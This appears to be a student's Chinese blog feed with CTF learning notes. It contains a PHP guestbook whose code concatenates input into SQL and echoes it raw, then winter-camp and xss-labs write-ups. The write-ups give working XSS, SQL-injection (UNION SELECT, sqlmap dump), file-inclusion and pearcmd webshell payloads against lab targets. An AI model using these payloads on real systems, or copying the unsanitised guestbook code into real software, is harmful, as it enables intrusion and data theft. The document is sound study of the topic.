class="string">&quot;&lt;script&gt;alert(&#x27;输入不能为空&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;该用户名已被注册！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给留言板开个表<br><code>create table guestbook (message VARCHAR(2500));</code><br>偶们留言板是匿名的😎😎😎非常酷炫捏。。。。（其实是能少写一点是一点捏。。。。。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;简陋留言板&lt;/title&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">	&lt;p&gt;你好捏。。。要写点什么不。。。？&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost/guestbook.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">	&lt;p&gt;写点什么: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;message&quot;</span> /&gt;&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;login&quot;</span> value=<span class="string">&quot;提交&quot;</span>/&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// $sql=&quot;select message from guestbook where message=&#x27;$message&#x27;&quot;;</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="string">&quot;select * from guestbook&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$datarow</span> = <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$message</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$insert</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="string">&quot;insert into guestbook (message) values (&#x27;<span class="subst">$message</span>&#x27;) &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;123.php&#x27;&gt;登出&lt;/a&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;font-size: 32px&#x27;&gt;一些前人留言。。&lt;/span&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;= <span class="variable">$datarow</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="variable">$sql_arr</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">	<span class="variable">$message</span> = <span class="variable">$sql_arr</span>[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$message</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// while($sql_arr = mysqli_fetch_assoc($result))&#123;</span></span><br><span class="line"><span class="comment">// 	echo $sql_arr[&#x27;message&#x27;].&#x27;&lt;br/&gt;&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>OMG刚刚看了一眼原来要输出留言人的捏。。。。。。。。没关系这部分可以明天再写因为本人累了今天不想写了不如读书。。。。。。。。。。</p>
<p>现在存在的问题是</p>
<ol>
<li>留言板根本没有留言人；</li>
<li>留言板里数据库最上面一行的数据不知道为什么没有显示在页面上</li>
<li>理论上说留言板的顺序应该是新发布的浮在上面，但是我没有捏（不过这个循环改一下就好应该</li>
<li>其实不登录直接登guestbook.php页面也可以发留言。。这部分可以改进一下。。</li>
<li>发完留言后自己的留言不能刷新一下就出来，因为<code>你查找的页面使用了你输入的信息。返回此页面可能导致重复你在那里进行的任何操作。是否继续?</code>会导致数据库输入两次数据。。</li>
<li>留言板完全不安全，随便<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>一下直接干懵。。不过这个不着急。。。</li>
</ol>
<p>放一下做完的图片吧。。今天的学习就敷衍到这里啦。。<br>登录页面<br><img src="https://img.mjj.today/2023/01/30/401428a881632f1384debbc5b7589219.png" alt="401428a881632f1384debbc5b7589219.png"><br>注册页面<br><img src="https://img.mjj.today/2023/01/30/c9653f45d80bc6bcbf32189a59d748f4.png" alt="c9653f45d80bc6bcbf32189a59d748f4.png"><br>留言板页面<br><img src="https://img.mjj.today/2023/01/30/9de939df400a58bece0673519129c94d.png" alt="9de939df400a58bece0673519129c94d.png"><br>写点什么吧。。<br><img src="https://img.mjj.today/2023/01/30/0601d22a29a50fb1448eb89f7ca12be3.png" alt="0601d22a29a50fb1448eb89f7ca12be3.png"><br><img src="https://img.mjj.today/2023/01/30/226ac99ca158e87bc3a0bfa68133c9a4.png" alt="226ac99ca158e87bc3a0bfa68133c9a4.png"><br>然后是我的数据库和两个表。。<br><img src="https://img.mjj.today/2023/01/30/8a854421ef954ee8e6dc89a76081ea91.png" alt="8a854421ef954ee8e6dc89a76081ea91.png"><br>好啦。。。明天再见吧。。。。</p>
<h3 id="2023-x2F-02-x2F-24"><a href="#2023-x2F-02-x2F-24" class="headerlink" title="2023&#x2F;02&#x2F;24"></a>2023&#x2F;02&#x2F;24</h3><p>放一下留言板源码。。<br><a href="https://github.com/LinTurrr/A_Useless_Message_Board.git">林涂的留言板代码</a></p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS冬令营第二周WriteUp</title>
    <url>/2023/01/25/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%BA%8C%E5%91%A8Write-Up/</url>
    <content><![CDATA[<p>（1.27更了跟没更似的）ROIS冬令营第二周Write Up</p>
<span id="more"></span>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week2-XssTest"><a href="#Week2-XssTest" class="headerlink" title="[Week2]XssTest"></a>[Week2]XssTest</h3><p>这题没做出来</p>
<p>根据hint1可知：</p>
<blockquote>
<p>这是DOM型XSS，其与反射型和存储型的区别是XSS代码的解析，不需要服务器解析响应的直接参与，由浏览器的DOM进行解析。名字也是因此得来。</p>
</blockquote>
<blockquote>
<p>DOM型的XSS漏洞不同于反射型和存储型并不经过后台，只是在前端被dom获取到，通过dom又在前端输出了。</p>
</blockquote>
<p>根据hint2：</p>
<blockquote>
<ol>
<li>使用JavaScript的document.cookie函数，将cookie输出到页面上；</li>
<li>将页面的URL地址发送给bot，让bot去截图；</li>
<li>截图返回后，从截图中提取cookie信息。</li>
</ol>
</blockquote>
<blockquote>
<p>cookie是一种存储在用户计算机中的小文件，用于跟踪用户的浏览器会话状态，以便网站能够记住用户的设置，如登录状态、语言和其他参数。</p>
</blockquote>
<p>尝试构建语句<code>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;</code>失败<br>还试了些别的，不过都没有成功。。这里就不放了</p>
<p>在网上搜索同类型题时看到一种做法<br><a href="https://blog.csdn.net/weixin_52116519/article/details/124480558">[ctfhub]-xss详解</a><br>然后也用这种办法尝试了，但是cookie那里没有东西出来，猜测可能人家的题是反射型咱这是DOM型（当然还可能是因为别的不过我还在研究</p>
<h4 id="2023-x2F-01-x2F-26-学习-amp-amp-尝试"><a href="#2023-x2F-01-x2F-26-学习-amp-amp-尝试" class="headerlink" title="2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试</h4><blockquote>
<p>使用<code>&lt;script&gt;</code>存在的问题是：页面加载中<code>&lt;script&gt;</code>标签是已经加载过的，通过JavaScript再往页面再写入<code>&lt;script&gt;</code>标签的话，它是不会去执行的。<br><strong>【DOM型XSS和其他XSS的区别之一】</strong></p>
</blockquote>
<blockquote>
<p><code>document.write()</code>可向文档写入文本内容，如果在文档已完成加载后执行 <code>document.write()</code>，整个 HTML 页面将被覆盖。</p>
</blockquote>
<p><strong>padload：</strong><br><code>&lt;img src=1 onerror=document.write(document.cookie)&gt;</code><br>。。。吗吖加载了两小时小时终于出来了<br>。。。我不会说我直接图片转文字大写I和小写l全嘎嘎乱出导致我交错了四次但这是事实<br>。。。吗吖我是若汁</p>
<p>理论上以下几种应该也可以，但是我没成功。。。：<br><code>&lt;img src=document.domain onerror=alert(document.cookie)&gt;</code><br><code>&lt;details open ontoggle=document.write(document.cookie)&gt;</code></p>
<h3 id="Week2-ez-php-source"><a href="#Week2-ez-php-source" class="headerlink" title="[Week2]ez_php_source"></a>[Week2]ez_php_source</h3><p>用HackBar也能做，不过这里讲BurpSuite</p>
<p>第一部分：</p>
<ol>
<li><code>?b=408</code>；</li>
<li>改POST；</li>
<li>加<code>Content-Type: application/x-www-form-urlencoded</code>请求头；</li>
<li>尾部<code>a=405</code>；</li>
</ol>
<p>第二部分：<br>首先了解PHP&#x3D;&#x3D;&#x3D;强弱类型<br><a href="https://blog.csdn.net/m0_56691564/article/details/127380406?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-2-127380406-blog-109427287.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-2-127380406-blog-109427287.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=3">ctf中MD5绕过详细总结及例题[BJDCTF2020]Easy MD5</a><br>然后看得出来这里是强类型，使用数组绕过，用&amp;跟a连在一起<br><code>a=405&amp;c[]=1&amp;d[]=2</code></p>
<p>第三部分：</p>
<blockquote>
<p>GET里的变量全都会自动进行urldecode。<br>POST里的变量只有Content-Type: application&#x2F;x-www-form-urlencoded下会自动进行urldecode。</p>
</blockquote>
<p>由题意得：<br><code>$_POST[&#39;last1&#39;]==&#39;TheBestLanguage====PHP&#39;</code>；然后加完密的last1等于解密的last2</p>
<p>可得last2为last1进行urlencode三次</p>
<p>以下为全部的数据包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?b=408&amp;last2=TheBestLanguage%25253D%25253D%25253D%25253DPHP HTTP/1.1</span><br><span class="line">Host: 。。。。</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 46</span><br><span class="line"></span><br><span class="line">a=405&amp;c[]=1&amp;d[]=2&amp;last1=TheBestLanguage====PHP</span><br></pre></td></tr></table></figure>
<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p>补个Hackbar的。。其实是一样的<br>GET：<code>http://101.43.57.52:28082/?b=408&amp;last2=TheBestLanguage%253D%253D%253D%253DPHP</code><br>POST：<code>a=405&amp;c[]=1&amp;d[]=2&amp;last1=TheBestLanguage====PHP</code></p>
<h3 id="Week2-very-easy-sql"><a href="#Week2-very-easy-sql" class="headerlink" title="[Week2]very_easy_sql"></a>[Week2]very_easy_sql</h3><p>首先尝试万能密码<code>admin&#39; or 1=1#</code>,出现<code>用户：why 欢迎登录！</code>字样。</p>
<p>然后。。。。没思路了（目移）。。。用sqlmap做的，这里写一下sqlmap的过程</p>
<ol>
<li>bp抓包，发现是POST类型的，设置<code>username=why&amp;password=1</code>并把提交的数据包保存下来，保存为xxx.txt</li>
<li>在sqlmap里输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot;</code></li>
<li>然后出来了一个<code>heuristic (basic) test shows that POST parameter &#39;username&#39; might not be injectable</code>和一个<code>heuristic (basic) test shows that POST parameter &#39;password&#39; might not be injectable</code>表明username和password可能是可注入的</li>
<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -dbs</code>获取所有数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] ez_sql</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br></pre></td></tr></table></figure></li>
<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -current-db</code>获得当前数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">current database: &#x27;ez_sql&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql --tables</code>获得数据库ez_sql下的所有表<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure></li>
<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql -T users --columns</code>获取users表里的所有字段<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(11)     |</span><br><span class="line">| password | varchar(30) |</span><br><span class="line">| username | varchar(10) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure></li>
<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql -T users -C id,password,username --dump</code>获取字段值<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">Table: users</span><br><span class="line">[8 entries]</span><br><span class="line">+----+-------------+----------+</span><br><span class="line">| id | password    | username |</span><br><span class="line">+----+-------------+----------+</span><br><span class="line">| 1  | why         | why      |</span><br><span class="line">| 2  | nobody      | nobody   |</span><br><span class="line">| 3  | does        | does     |</span><br><span class="line">| 4  | misc        | misc     |</span><br><span class="line">| 5  | im          | im       |</span><br><span class="line">| 6  | so          | so       |</span><br><span class="line">| 7  | sad         | sad      |</span><br><span class="line">| 8  | ROIS&#123;*****&#125; | admin    |</span><br><span class="line">+----+-------------+----------+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>sqlmap使用方法参考：<br><a href="https://blog.csdn.net/weixin_43882862/article/details/119673249">CTF刷题–SQL注入（sqlmap）</a><br><a href="https://blog.csdn.net/songbai220/article/details/109303110">sqlmap使用教程(超详细)</a><br><a href="https://blog.csdn.net/weixin_42529890/article/details/107238671">[网络安全自学篇] 二十七.Sqlmap基础用法、CTF实战及请求参数设置（一）</a></p>
<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试-1"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试-1" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p>按wp顺序过一遍。。显然我自己是不会做的。。</p>
<ol>
<li>测测闭合，这里是单引号闭合</li>
</ol>
<blockquote>
<p>闭合判断是进行手动注入的第一步，判断闭合之后就可以开始注入了。</p>
</blockquote>
<ol start="2">
<li>用<code>order by</code>测测有几个表</li>
</ol>
<blockquote>
<p><code>order by</code>是SQL语句中用来指定查询结果按照某个字段排序的语句。</p>
</blockquote>
<ol start="3">
<li><p><code>&#39; order by 3 #</code>是“不存在或密码错误！”<br><code>&#39; order by 4 #</code>是“啊哦，出错了！”<br>易得，表是三列的。</p>
</li>
<li><p>由于页面总会返回输入的username信息，所以可以尝试把信息输出到这里。</p>
</li>
</ol>
<blockquote>
<p><code>union select</code>是一种 SQL 注入技术，用于查询多个表中的数据。它的工作原理是，将多个查询结果合并成一个结果集，以便攻击者可以从数据库中获取敏感信息。</p>
</blockquote>
<ol start="5">
<li><p>输入<code>&#39; union select 1,2,3 #</code>网页输出“用户：2 欢迎登录！”，所有第二列是可以返回信息的。</p>
</li>
<li><p>输入<code>admin&#39; union select 1,2,3 #</code>网页输出“用户：admin 欢迎登录！”没有输出“2”，所以要用group_concat将所有结果放在同一行内。</p>
</li>
</ol>
<blockquote>
<p>group_concat是MySQL数据库的一个函数，它可以将多行查询结果合并为一行，以逗号分隔各个字段。它可以用来检测SQL注入漏洞，因为它可以将多行查询结果合并为一行，以便检测SQL注入漏洞。</p>
</blockquote>
<ol start="7">
<li>输入<code>admin&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata #</code>获得数据库名称</li>
</ol>
<blockquote>
<p>SCHEMA_NAME，表示数据库名称；<br>information_schema.schemata是MySQL中的一个系统表，它存储了数据库中每个数据库的信息，包括数据库名称、字符集和排序规则等。</p>
</blockquote>
<ol start="8">
<li><p>返回了“用户：information_schema,mysql,performance_schema,test,ez_sql 欢迎登录！”其中ez_sql是当前数据库。</p>
</li>
<li><p>输入<code>&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;ez_sql&#39; #</code>获得数据库ez_sql下的所有表名称</p>
</li>
</ol>
<blockquote>
<p>TABLE_NAME表示所属的表的名称；<br>TABLE_SCHEMA表示表所属的数据库名称；<br>information_schema.tables 是MySQL中的一个系统表，它包含了数据库中所有表的信息。它主要用于查询数据库中的表和表的属性，如表名，表的列名，表的类型等。</p>
</blockquote>
<ol start="10">
<li><p>返回了“用户：users 欢迎登录！”</p>
</li>
<li><p>输入<code>&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; #</code>获取users表里的所有字段</p>
</li>
</ol>
<blockquote>
<p>COLUMN_NAME表示字段名；<br>information_schema.columns是MySQL中的一个系统表，它包含了数据库中所有表的列信息，包括列名、数据类型、是否可为空等等。</p>
</blockquote>
<ol start="12">
<li><p>返回了“用户：USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password 欢迎登录！”</p>
</li>
<li><p>输入<code>&#39; union select 1,group_concat(concat_ws(&#39;:&#39;,id,username,password)),3 from ez_sql.users #</code>获取字段值</p>
</li>
</ol>
<blockquote>
<p>concat_ws()函数是MySQL中的一个字符串函数，它可以将多个字符串合并为一个字符串，并且可以在每个字符串之间添加一个分隔符。例如：concat_ws(‘,’,’hello’,’world’)将返回字符串’hello,world’。</p>
</blockquote>
<ol start="14">
<li>返回了“用户：1:why:why,2:nobody:nobody,3:does:does,4:misc:misc,5:im:im,6:so:so,7:sad:sad,8:admin:ROIS{*****} 欢迎登录！”</li>
</ol>
<h3 id="Week2-double-cmd-amp-amp-Week2-double-cmd-plus"><a href="#Week2-double-cmd-amp-amp-Week2-double-cmd-plus" class="headerlink" title="[Week2]double_cmd &amp;&amp;[Week2]double_cmd_plus"></a>[Week2]double_cmd &amp;&amp;[Week2]double_cmd_plus</h3><p>没做出来</p>
<p>思路：<br>易得，该段代码会接收来自网页表单的参数cmd，并将其作为文件路径，然后进行包含。但是在包含之前，会将参数中的”flag”字符串替换为空字符。<br>与我之前看到的文件包含题不同（主要是我没见识），这玩意儿是POST传参的。<br>我尝试了<code>cmd=flflagag</code>绕过，虽然输出了flag但是不知道下一步该怎么做，然后就卡在这里了。</p>
<p>春节期间比我想得要忙，也没做几道题，只能写点浅显的东西勉勉强强这样子。。。</p>
<h4 id="2023-x2F-01-x2F-26-学习-amp-amp-尝试-1"><a href="#2023-x2F-01-x2F-26-学习-amp-amp-尝试-1" class="headerlink" title="2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试</h4><p><strong>[Week2]double_cmd</strong></p>
<ol>
<li><code>cmd=flflagag</code>双写绕过</li>
</ol>
<blockquote>
<p>没有结果是因为<code>include($cmd)</code>中cmd&#x3D;flag的flag是在网站目录的，而网站目录会显示404，说明flag应该是在根目录情况下</p>
</blockquote>
<ol start="2">
<li><code>cmd=/flflagag</code>绝对路径看看,但是无事发生</li>
</ol>
<blockquote>
<p>绝对路径是指文件或文件夹在计算机系统中的完整路径，它包括所有父文件夹的名称，以及最后的文件或文件夹的名称</p>
</blockquote>
<ol start="3">
<li>由题意得，可以用PHP伪协议绕过<code>cmd=php://filter/convert.base64-encode/resource=/flaflagg</code></li>
</ol>
<blockquote>
<p>PHP伪协议是一种用于从服务器获取文件的协议，它允许用户以URL的形式从服务器中读取文件，而无需使用FTP或其他文件传输协议。PHP伪协议使用“php:&#x2F;&#x2F;”作为URL的前缀，以便能够识别它。<br><code>?file=php://filter/convert.base64-encode/resource=index.php</code><br>php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F;表示读取的方式是base64编码，resource&#x3D;index.php表示目标文件为index.php。</p>
</blockquote>
<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试-2"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试-2" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p><strong>[Week2]double_cmd_plus</strong><br>等等。。还在捋。。。。。。。。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?+config-create+/&amp;/&lt;?=eval($_POST[123])?&gt;+/tmp/hello.php HTTP/1.1</span><br><span class="line">cmd=flaflagg/../../../../../../../../../../../../usr/local/lib/php/pearcmd.php</span><br><span class="line"></span><br><span class="line">http://101.43.57.52:28084/index.php</span><br><span class="line">cmd=flflagag/../../../../../../../../../../../../tmp/hello.php&amp;123=system(&quot;/readflag&quot;);</span><br></pre></td></tr></table></figure>
<p>按视频做法走了一遍大概是这样。。。让我捋捋。。让我捋捋。。。。。。。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Week2-八重神子的尾巴"><a href="#Week2-八重神子的尾巴" class="headerlink" title="[Week2]八重神子的尾巴"></a>[Week2]八重神子的尾巴</h3><p>Winhex，最后面，flag</p>
<h3 id="Week2-扫雷"><a href="#Week2-扫雷" class="headerlink" title="[Week2]扫雷"></a>[Week2]扫雷</h3><p>我不知道预期解法是什么样的，反正我老老实实扫了两小时雷，扫完出来看得出来是张二维码，但是扫不出来；然后电脑找个画像素画的网站，一格一格涂出来，然后，扫。</p>
<h3 id="Week2-爱门！"><a href="#Week2-爱门！" class="headerlink" title="[Week2]爱门！"></a>[Week2]爱门！</h3><p>由题意得，是PNG图片格式隐写，把图片高度改高即可。<br>Winhex打开</p>
<blockquote>
<p><strong>00-07</strong> 89 50 4E 47 0D 0A 1A 0A 固定<br><strong>08-0B</strong> 标识IHDR区的大小<br><strong>0C-0F</strong> 49 48 44 52 固定（IHDR区）<br><strong>10-13</strong> 图片宽度<br><strong>14-17</strong> 图片高度（本题就是改这里改大就好</p>
</blockquote>
<h3 id="Week2-真的加密了吗？"><a href="#Week2-真的加密了吗？" class="headerlink" title="[Week2]真的加密了吗？"></a>[Week2]真的加密了吗？</h3><p>伪加密，09改回00即可。<br>Winhex打开</p>
<blockquote>
<p><strong>压缩源文件数据区：</strong><br>50 4B 03 04 头文件标记<br>14 00 解压文件所需 pkware 版本<br>00 00 全局加密（改这里</p>
</blockquote>
<blockquote>
<p><strong>压缩源文件目录区：</strong><br>50 4B 01 02 目录中文件文件头标记<br>3F 00 压缩使用的 pkware 版本<br>14 00 解压文件所需 pkware 版本<br>00 00 全局方式位标记（还有这里<br>↑↑↑↑↑↑↑↑改这个会显示是否有密码</p>
</blockquote>
<blockquote>
<p><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06 目录结束标记 </p>
</blockquote>
<h3 id="Week2-guess"><a href="#Week2-guess" class="headerlink" title="[Week2]guess"></a>[Week2]guess</h3><p>我觉得根据题意显然是爆破，但是。。。。我爆破了三天，用了各种组合（belike：6位内所有字符；8位内大小写字母，7位内大小写字母加数字，10位数字等等等等等等等）出来了三个密码，输进去打开文件全是乱码，第四天电脑趁我挂机偷偷更新，重启打开都不知道爆破到哪里去了，遂作罢。</p>
<p>（2023年1月25日22点23分：吗吖怎么真靠猜啊。。第一排字母。。确实是很简单。。理是这个理没错。。但是。。但是。。好吧是弱密码爆破倒也没错。。。。。。<br>（2023年1月25日22点26分：说起来我怎么没想到用十位小写字母爆破一下，没准爆个两天也爆出来了呢（在口嗨</p>
<h3 id="Week2-透视"><a href="#Week2-透视" class="headerlink" title="[Week2]透视?"></a>[Week2]透视?</h3><p>打开压缩包发现5个TXT文件大小分别为16，15，18，16，17字节刚好满足crc32暴破的条件（小于等于18）。<br>遂采用crc32爆破</p>
<p>很不巧本人还不会用python写脚本爆破，上网找了个CRC32爆破工具<br><a href="https://github.com/theonlypwner/crc32">https://github.com/theonlypwner/crc32</a><br>使用方法：<code>python crc32.py reverse 0x（crc32密文）</code><br>这个工具可以解4字节和6字节的字符串，然而不幸的事情又发生了，这玩意儿里面还有一个3字节和一个5字节，网上找了个别人的代码<br><a href="https://blog.csdn.net/WFC1006848997/article/details/110295708">CRC32碰撞脚本（1-5字节）</a><br>5字节有点慢，不过能凑合着用。</p>
<p>最后一个个解出来拼在一起，就是flag。</p>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>xss学习做题wp</title>
    <url>/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/</url>
    <content><![CDATA[<p>xss，没学过，不会做，找点题来练练手<br>闯关网址<a href="http://test.xss.tv/">http://test.xss.tv</a></p>
<span id="more"></span>
<p>上网看到有个测试神句<code>&lt;script &quot; &#39;Oonn&gt;</code>但是我还不怎么会用</p>
<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>经典代码<br><code>&lt;script&gt;alert()&lt;/script&gt;</code></p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>用用那个什么<code>&lt;script &quot; &#39;Oonn&gt;</code>神句看看<br>搜索框里只出现了<code>&lt;script </code>猜测可以用双引号绕过<br>闭合绕过<br><code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;</code></p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code><br>搜索框里只出现了<code>&lt;script &quot; </code>猜测可以用单引号绕过<br><code>&#39;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#39;</code><br>左边一个&gt;闭合，右边一个&lt;和末端的&gt;闭合<br>什么单引号也不行？！右键源代码一探究竟<br>看到<code>value=&#39;&amp;lt;script &amp;quot; &#39;Oonn&amp;gt;&#39;</code><br>OMG原来大于小于被转义了！好悲伤的一道题<br>浅浅网上随便找个不用大于小于的<br><code>&#39;onmouseover=&#39;alert()</code>然后点击搜索</p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里只剩<code>script</code><br>源代码<code>value=&quot;script &quot; &#39;Oonn&quot;</code><br>卡在双引号，大于小于不能用因为被过滤了<br>那不和上一题一样只是单引变双引嘛<br><code>&quot;onmouseover=&quot;alert()</code></p>
